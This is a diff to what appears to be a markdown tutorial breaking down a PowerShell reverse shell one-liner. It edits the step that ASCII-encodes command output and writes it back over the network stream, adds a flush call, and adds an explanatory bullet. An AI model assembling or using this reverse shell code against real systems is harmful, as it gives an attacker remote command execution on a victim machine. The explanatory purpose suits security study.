@@ -74,5 +74,6 @@ $sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
 
 ### Sets Sendbyte
 ```powershell
-$sendbyte = ([text:encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)
+$sendbyte = ([text:encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
 ```
+- Sets `$sendbyte` equal to the ASCII encoded byte stream 
